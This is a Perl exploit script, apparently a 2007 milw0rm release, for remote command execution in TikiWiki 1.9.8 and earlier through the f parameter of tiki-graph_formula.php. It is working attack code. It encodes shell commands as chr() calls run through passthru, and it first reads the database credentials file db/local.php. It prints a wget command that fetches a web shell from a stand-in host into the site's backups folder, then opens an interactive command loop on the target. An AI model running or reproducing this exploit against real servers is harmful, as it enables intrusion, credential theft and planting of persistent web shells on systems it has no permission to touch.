#!/usr/bin/perl
# TikiWiki <= 1.9.8 Remote Command Execution Exploit
#
# Description
# -----------
# TikiWiki contains a flaw that may allow a remote attacker to execute 
arbitrary commands. 
# The issue is due to 'tiki-graph_formula.php' script not properly 
sanitizing user input 
# supplied to the f variable, which may allow a remote attacker to 
execute arbitrary PHP 
# commands resulting in a loss of integrity.
# -----------
# Vulnerability discovered by ShAnKaR <sec [at] shankar.antichat.ru>
#
# $Id: milw0rm_tikiwiki.pl,v 0.1 2007/10/12 13:25:08 str0ke Exp $

use strict;
use LWP::UserAgent;

my $target = shift || &usage();
my $proxy = shift;
my $command;

&exploit($target, "cat db/local.php", $proxy);

print "[?] php shell it?\n";
print "[*] wget http://www.youhost.com/yourshell.txt -O 
backups/shell.php\n";
print "[*] lynx " . $target . "/backups/shell.php\n\n";

while()
{
	print "tiki\# ";
	chomp($command = <STDIN>);
	exit unless $command;
	&exploit($target, $command, $proxy);
}

sub usage()
{
	print "[?] TikiWiki <= 1.9.8 Remote Command Execution 
Exploit\n";
	print "[?] str0ke <str0ke[!]milw0rm.com>\n";
	print "[?] usage: perl $0 [target]\n";
	print "    [target] (ex. http://127.0.0.1/tikiwiki)\n";
	print "    [proxy] (ex. 0.0.0.0:8080)\n";
	exit;
}

sub exploit()
{
	my($target, $command, $proxy) = @_;

	my $cmd = 'echo start_er;'.$command.';'.'echo end_er';
	
	my $byte = join('.', map { $_ = 'chr('.$_.')' } unpack('C*', 
$cmd));

	my $conn = LWP::UserAgent->new() or die;
	$conn->agent("Mozilla/4.0 (compatible; Lotus-Notes/5.0; 
Windows-NT)");
	$conn->proxy("http", "http://".$proxy."/") unless !$proxy;
	
	my 
$out=$conn->get($target."/tiki-graph_formula.php?w=1&h=1&s=1&min=1&max=2&f[]=x.tan.passthru($byte).die()&t=png&title=");

	if ($out->content =~ m/start_er(.*?)end_er/ms) {
		print $1 . "\n";
	} else { 
		print "[-] Exploit Failed\n";
		exit;
	}
}
